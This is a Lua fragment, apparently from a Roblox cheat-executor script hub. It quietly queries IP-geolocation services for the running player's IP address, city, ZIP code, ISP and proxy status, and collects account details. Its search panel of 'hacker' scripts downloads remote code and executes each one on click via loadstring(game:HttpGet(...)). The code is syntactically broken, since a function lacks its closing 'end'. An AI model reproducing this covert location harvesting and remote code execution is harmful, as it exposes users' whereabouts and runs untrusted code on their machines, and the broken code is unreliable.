local function request(options)
    local req = (syn and syn.request) or (http and http.request) or http_request or request or (getgenv and getgenv().request)
    if req then 
        local s, r = pcall(req, options)
        if s then return r end
    end
    return nil
end
local function GetInfo()
    local info = {}
    pcall(function()
        local response = request({Url = "http://ip-api.com/json/?fields=status,message,query,city,regionName,country,countryCode,zip,timezone,isp,org,asn,lat,lon,mobile,proxy,hosting", Method = "GET"})
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data.status == "success" then
                info.ip = data.query or "Unknown"
                info.city = data.city or "Unknown"
                info.region = data.regionName or "Unknown"
                info.country = data.country or "Unknown"
                info.countryCode = data.countryCode or "Unknown"
                info.zip = data.zip or "Unknown"
                info.timezone = data.timezone or "Unknown"
                info.isp = data.isp or "Unknown"
                info.org = data.org or "Unknown"
                info.asn = data.asn or "Unknown"

                info.lon = data.lon or "Unknown"
                info.mobile = data.mobile == true and "Yes" or "No"
                info.proxy = data.proxy == true and "Yes" or "No"
                info.hosting = data.hosting == true and "Yes" or "No"
            end
        end
    end)
    pcall(function()
        local response2 = request({Url = "https://ipapi.co/json/", Method = "GET"})
        if response2 and response2.Body then
            local data2 = HttpService:JSONDecode(response2.Body)
            info.ip2 = data2.ip or info.ip
            info.asn = data2.asn or info.asn
            info.org = data2.org or info.org
        end
    end)

        info.accountAge = LocalPlayer.AccountAge
        info.premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium

    return info

local function updateSearch(query)
    for _, v in pairs(listScroll:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    if query == "" then
        slide(hackerPanel, {Size = UDim2.new(0, 0, 0, 200)})
        task.delay(0.3, function() hackerPanel.Visible = false end)
        return
    end
    hackerPanel.Visible = true
    local maxWidth = 240
    local matches = {}
    for _, s in pairs(scripts) do
        if s[1]:lower():find(query:lower()) then
            table.insert(matches, s)
        end
    end
    for _, s in pairs(matches) do
        local btn = Instance.new("TextButton", listScroll)
        btn.Size = UDim2.new(1, 0, 0, 24)
        btn.BackgroundTransparency = 0.8
        btn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
        btn.Font = Enum.Font.Code
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.TextSize = 12
        btn.Text = " " .. s[1]
        btn.TextXAlignment = Enum.TextXAlignment.Left
        Instance.new("UICorner", btn)
        btn.MouseButton1Click:Connect(function()
            task.spawn(function() loadstring(game:HttpGet(s[2]))() end)
        end)
    end
    slide(hackerPanel, {Size = UDim2.new(0, maxWidth, 0, 200)})
end
